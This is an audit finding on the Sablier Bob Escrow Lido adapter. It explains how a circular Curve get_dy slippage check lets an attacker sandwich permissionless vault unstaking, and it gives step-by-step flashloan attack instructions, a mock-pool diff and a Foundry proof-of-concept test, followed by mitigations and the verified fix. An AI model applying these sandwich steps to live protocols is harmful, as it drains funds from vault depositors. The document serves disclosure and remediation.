---
tags:
  - lang/solidity
  - lang/vyper
  - sector/dex
  - sector/governance
  - sector/lending
  - sector/liquid-staking
  - sector/oracle
  - sector/staking
  - sector/staking-pool
  - sector/streaming
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - vuln/oracle/spot-price
  - impact/mev/sandwich
  - trigger/sandwich-attack
  - novelty/known-pattern
  - misassumption/oracle-is-reliable
  - misassumption/price-cannot-be-manipulated
  - fix/use-twap
  - trigger/price-manipulation
protocol: "[[Sablier]]"
auditors:
  - "[[MrPotatoMagic]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-25-cyfrin-sablier-bob-escrow-v2.0.md"
genome:
  - "[[spot-price]]"
  - "[[sandwich]]"
  - "[[defi/sandwich-attack]]"
  - "[[known-pattern]]"
  - "[[chainlink-round-completeness]]"
  - "[[fot-slippage]]"
  - "[[frontrun-exposure]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
  - "[[oracle-manipulation-resistance]]"
---
# Circular slippage protection in `SablierLidoAdapter::_wstETHToWeth` enables sandwich attacks on adapter vault unstaking

- id: 65583
- impact: HIGH
- protocol: [[Sablier]] Bob Escrow
- reporter: MrPotatoMagic (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-25-cyfrin-sablier-bob-escrow-v2.0.md

## Summary


The bug report describes a vulnerability in the SablierLidoAdapter contract, specifically in the `_wstETHToWeth` function. This function uses the Curve stETH/ETH pool's `get_dy` function to calculate the minimum acceptable output for a swap. However, both `get_dy` and `exchange` use the same pattern to read the current reserves of the pool, which can be manipulated by an attacker before the transaction is executed. This allows the attacker to depress the price and pass the slippage tolerance check, resulting in a lower payout for users when they unstake their tokens.

The vulnerability can be exploited by an attacker who can sandwich their own call between the `unstakeTokensViaAdapter` function and the `exchange` function. This can result in a permanent reduction in the WETH payout for all users in the vault. The impact of this attack can be significant, especially for large vaults, as the attacker can monitor and sandwich multiple vault settlements.

The report suggests three potential mitigations for this vulnerability: using a Chainlink oracle for the `minEthOut` calculation, allowing the caller to specify the `minEthOut` value, or using Lido's native withdrawal queue. The Sablier team has fixed the issue by replacing the Curve spot price reference with a Chainlink oracle. They have also added a check to revert if the oracle price is zero, to avoid zero slippage swaps. Cyfrin has verified the fix.

## Details

**Description:** In `SablierLidoAdapter::_wstETHToWeth` (`SablierLidoAdapter.sol:367-389`), the minimum acceptable output for the Curve swap is derived from `get_dy` - a view function that returns the expected output based on the pool's **current reserves**:

```solidity
uint256 expectedEthOut = ICurveStETHPool(CURVE_POOL).get_dy(1, 0, stETHAmount);
uint256 minEthOut = ud(expectedEthOut).mul(UNIT.sub(slippageTolerance)).unwrap();
uint256 ethReceived = ICurveStETHPool(CURVE_POOL).exchange(1, 0, stETHAmount, minEthOut);
```

The Curve stETH/ETH pool's [`get_dy`](https://github.com/curvefi/curve-contract/blob/master/contracts/pools/steth/StableSwapSTETH.vy#L419-L425) reads the current pool balances via `self._balances()` to compute its output:

```vyper
@view
@external
def get_dy(i: int128, j: int128, dx: uint256) -> uint256:
    xp: uint256[N_COINS] = self._balances()   # reads CURRENT reserves
    x: uint256 = xp[i] + dx
    y: uint256 = self.get_y(i, j, x, xp)
    dy: uint256 = xp[j] - y - 1
    fee: uint256 = self.fee * dy / FEE_DENOMINATOR
    return dy - fee
```

The `exchange` function uses the same `self._balances()` pattern. Since both functions read the current reserve state and execute in the same transaction, if an attacker manipulates the pool reserves before the transaction, `get_dy` returns a value reflecting the manipulated state, and the slippage tolerance (max 5%) is applied to the already-depressed price. The protection is circular - it only guards against price movement *between* `get_dy` and `exchange` within the same atomic transaction, which is always zero. This is a [known vulnerability pattern with on-chain slippage calculation](https://dacian.me/defi-slippage-attacks#heading-on-chain-slippage-calculation-can-be-manipulated). The manipulability of Curve's `get_dy` on the same stETH/ETH pool was also [confirmed as a high-severity finding in the Tapioca DAO audit](https://code4rena.com/reports/2023-07-tapioca#h-08-lidoethstrategy_currentbalance-is-subject-to-price-manipulation-allows-overborrowing-and-liquidations) where `get_dy(1, 0, stEthBalance)` was used identically.

`SablierBob::unstakeTokensViaAdapter` (`SablierBob.sol:425-468`) is permissionless - anyone can call it once a vault is settled or expired. This means the attacker controls exactly when the unstaking occurs and can sandwich their own call:

1. **Front-run**: Flashloan a large amount of stETH, dump it into the Curve pool → pushes down the stETH/ETH exchange rate
2. **Call `unstakeTokensViaAdapter`**: `get_dy` reads the manipulated reserves and returns a depressed `expectedEthOut`. `minEthOut` = depressed price * 95% - an even lower threshold. `exchange` executes at the manipulated rate and passes the check
3. **Back-run**: Buy back stETH cheaply from the now-imbalanced pool → profit from the price recovery

The damage is amplified because `_wethReceivedAfterUnstaking` is written once during `unstakeFullAmount` (`SablierLidoAdapter.sol:322`) and used as the denominator for **all subsequent user redemptions**. A single sandwich attack permanently reduces every user's WETH payout for that vault.

The same vulnerability applies to `unstakeForUserWithinGracePeriod` (`SablierLidoAdapter.sol:290-306`), which uses the same `_wstETHToWeth` function. While this path is only callable by `SablierBob` (not directly by the attacker), the user's `exitWithinGracePeriod` transaction can still be sandwiched in the mempool.

**Impact:** An attacker can steal a portion of every adapter vault's WETH during unstaking. The attack requires no special permissions - `unstakeTokensViaAdapter` is permissionless, so the attacker controls the timing perfectly. The profit equals the difference between the fair stETH/ETH rate and the manipulated rate, minus flashloan fees and gas. For large vaults, this can be substantial.

The 5% max slippage tolerance (`MAX_SLIPPAGE_TOLERANCE = 0.05e18`) caps the per-vault loss at ~5% of total staked value, but this is applied to every adapter vault that gets unstaked. Since the attacker can monitor all vault settlements and sandwich each one, the cumulative loss across the protocol can be significant.

**Proof of Concept:** The PoC requires a small backward-compatible addition to `MockCurvePool` in `tests/bob/mocks/MockLido.sol` - a `poolManipulationBps` variable that affects both `get_dy` and `exchange`, simulating an attacker skewing the pool's reserves via flashloan. When set, both functions return depressed values (matching real Curve behavior where spot price queries and swaps read the same reserves):
```diff
@ bob/tests/bob/mocks/MockLido.sol:109 @ contract MockCurvePool is ICurveStETHPool {
    /// @dev Slippage in basis points (e.g., 100 = 1% less than expected).
    uint256 public actualSlippage;

+   /// @dev Pool manipulation in basis points - simulates an attacker skewing reserves.
+   /// Affects BOTH get_dy and exchange (the spot price the pool reports).
+   uint256 public poolManipulationBps;

    constructor(address stETH_) {
        STETH = stETH_;
    }
@ bob/tests/bob/mocks/MockLido.sol:120 @ contract MockCurvePool is ICurveStETHPool {
    function exchange(int128, int128, uint256 dx, uint256) external payable override returns (uint256) {
        IStETH(STETH).transferFrom(msg.sender, address(this), dx);

-       // Calculate actual output with slippage simulation.
-       uint256 actualOutput = (dx * (10_000 - actualSlippage)) / 10_000;
+      // Calculate actual output with pool manipulation and slippage simulation.
+       uint256 actualOutput = dx;
+       if (poolManipulationBps > 0) {
+           actualOutput = (actualOutput * (10_000 - poolManipulationBps)) / 10_000;
+       }
+       if (actualSlippage > 0) {
+           actualOutput = (actualOutput * (10_000 - actualSlippage)) / 10_000;
+       }

        (bool success,) = msg.sender.call{ value: actualOutput }("");
        require(success, "ETH transfer failed");
        return actualOutput;
    }

-   function get_dy(int128, int128, uint256 dx) external pure override returns (uint256) {
-       // Always returns the expected 1:1 rate (no slippage in the quote).
+   function get_dy(int128, int128, uint256 dx) external view override returns (uint256) {
+       // When pool is manipulated, get_dy reflects the manipulated reserves.
+       if (poolManipulationBps > 0) {
+           return (dx * (10_000 - poolManipulationBps)) / 10_000;
+       }
        return dx;
    }

@ bob/tests/bob/mocks/MockLido.sol:148 @ contract MockCurvePool is ICurveStETHPool {
        actualSlippage = slippageBps;
    }

+   /// @notice Simulates an attacker manipulating pool reserves (e.g., via flashloan).
+   /// Affects both get_dy and exchange, modeling how a real sandwich attack works.
+   /// @param bps Manipulation in basis points (e.g., 400 = 4% price depression).
+   function setPoolManipulation(uint256 bps) external {
+       poolManipulationBps = bps;
+   }

    receive() external payable { }
}
```

Add the following test to `tests/bob/integration/concrete/unstake-full-amount/unstakeFullAmountPoC.t.sol`:

```solidity
/// Demonstrates a sandwich attack on unstakeTokensViaAdapter:
/// 1. Normal path: unstake without pool manipulation → fair WETH received
/// 2. Sandwich path: attacker manipulates pool reserves before unstaking →
///    get_dy returns depressed price, minEthOut is derived from depressed price,
///    exchange executes at depressed price and PASSES the slippage check
/// 3. Compare: sandwich path yields significantly less WETH, permanently
///    reducing _wethReceivedAfterUnstaking for all users in the vault
function test_PoC_SandwichAttackOnUnstaking() external {
    // Setup: create adapter vault, three users deposit 10 WETH each
    uint256 vaultId = createVaultWithAdapter();
    uint128 depositAmount = 10e18;

    setMsgSender(users.depositor);
    bob.enter(vaultId, depositAmount);

    setMsgSender(users.depositor2);
    bob.enter(vaultId, depositAmount);

    setMsgSender(users.alice);
    bob.enter(vaultId, depositAmount);

    // Total deposited: 30 WETH. Warp past expiry
    vm.warp(EXPIRY + 1);

    // ====== SNAPSHOT ======
    uint256 snapshotId = vm.snapshot();

    // ====== NORMAL PATH: unstake without manipulation ======
    bob.unstakeTokensViaAdapter(vaultId);
    uint256 normalWethReceived = adapter.getWethReceivedAfterUnstaking(vaultId);

    // ====== REVERT TO SNAPSHOT ======
    vm.revertTo(snapshotId);

    // ====== SANDWICH PATH: attacker manipulates pool before unstaking ======
    // Simulate attacker front-running: dumps stETH into Curve pool,
    // depressing the stETH/ETH rate by 4%.
    // Both get_dy and exchange now reflect the manipulated reserves.
    curvePool.setPoolManipulation(400); // 4% price depression

    // Attacker calls unstakeTokensViaAdapter (it's permissionless!)
    // Inside _wstETHToWeth:
    //   get_dy returns depressed value (manipulated reserves)
    //   minEthOut = depressed value * (1 - 0.5% tolerance) - even lower
    //   exchange executes at depressed rate - passes the check!
    bob.unstakeTokensViaAdapter(vaultId);
    uint256 sandwichWethReceived = adapter.getWethReceivedAfterUnstaking(vaultId);

    // Attacker back-runs: removes stETH from pool, profits from recovery
    curvePool.setPoolManipulation(0);

    // ====== VERIFY: sandwich reduced WETH received ======
    uint256 wethStolen = normalWethReceived - sandwichWethReceived;

    // The sandwich depressed the received WETH by ~4%
    assertGt(wethStolen, 0, "Sandwich should reduce WETH received");
    assertGt(
        wethStolen,
        (normalWethReceived * 3) / 100, // at least 3% loss
        "Loss should be significant (>3% of normal amount)"
    );

    // ====== VERIFY: slippage check did NOT protect users ======
    // The fact that unstakeTokensViaAdapter succeeded (didn't revert)
    // proves the circular slippage check passed despite 4% manipulation.
    assertGt(sandwichWethReceived, 0, "Unstaking succeeded despite manipulation");

    // ====== VERIFY: all users' redemptions are permanently affected ======
    setMsgSender(users.depositor);
    (uint128 depositorRedeem,) = bob.redeem(vaultId);

    // User should have received ~10 WETH worth (their 1/3 share),
    // but instead receives ~4% less due to the sandwich
    uint256 expectedFairShare = normalWethReceived / 3;
    uint256 actualShare = uint256(depositorRedeem);

    assertLt(actualShare, expectedFairShare, "User received less than fair share");
    uint256 userLoss = expectedFairShare - actualShare;
    assertGt(
        userLoss,
        (expectedFairShare * 3) / 100, // at least 3% loss per user
        "Per-user loss should be significant (>3%)"
    );
}
```

Run with: `forge test --match-test test_PoC_SandwichAttackOnUnstaking -vvv`

**Recommended Mitigation:** Replace the circular spot-price slippage protection with an external price reference. Options include:

1. **Use Chainlink stETH/ETH oracle for `minEthOut`**: The protocol already integrates Chainlink oracles - use a stETH/ETH feed (or derive the rate from stETH/USD and ETH/USD feeds) as the price reference instead of the manipulable Curve spot price:

```solidity
function _wstETHToWeth(uint128 wstETHAmount) private returns (uint128 wethReceived) {
    uint256 stETHAmount = IWstETH(WSTETH).unwrap(wstETHAmount);

    // Use oracle price instead of spot price for minEthOut
    uint256 oraclePrice = _getStETHToETHOraclePrice();
    uint256 fairEthOut = stETHAmount * oraclePrice / 1e18;
    uint256 minEthOut = ud(fairEthOut).mul(UNIT.sub(slippageTolerance)).unwrap();

    uint256 ethReceived = ICurveStETHPool(CURVE_POOL).exchange(1, 0, stETHAmount, minEthOut);
    // ...
}
```

2. **Allow caller to specify `minEthOut`**: Let the caller provide the minimum acceptable output computed off-chain, so they can use fair market data:

```solidity
function unstakeTokensViaAdapter(uint256 vaultId, uint256 minEthOut) external;
```

3. **Use Lido's native withdrawal queue**: Lido withdrawals process at the protocol-determined exchange rate (not a DEX spot price), eliminating the manipulation surface entirely.

**Sablier:** Fixed in commits:
* [2e0abaf](https://github.com/sablier-labs/lockup/commit/2e0abaf7b026126895443b416bd4bf3e7d6c9bea) - the Curve `get_dy` spot price reference has been replaced with a Chainlink oracle; `SablierLidoAdapter::_swapWstETHToWeth` now uses `STETH_ETH_ORACLE`
* [7fae842](https://github.com/sablier-labs/lockup/commit/7fae8429bdb2b88d4b0e63dcf25eb8a1477e5a8a) - after mitigation review, a check has been added to revert if the oracle price is zero, to avoid zero slippage swaps if the oracle is misbehaving. No other oracle-related checks were added to provide a balance between protecting the user but also allowing them to exit; we don't want their tokens to be locked forever simply because the oracle has problems.

**Cyfrin:** Verified; we note that the curve swap can execute with stale prices. This appears to be a design decision which:
* allows users to exit even if the Oracle is not behaving 100% correctly
* only reverts in the case that an unlimited slippage swap (oracle price is zero)

\clearpage
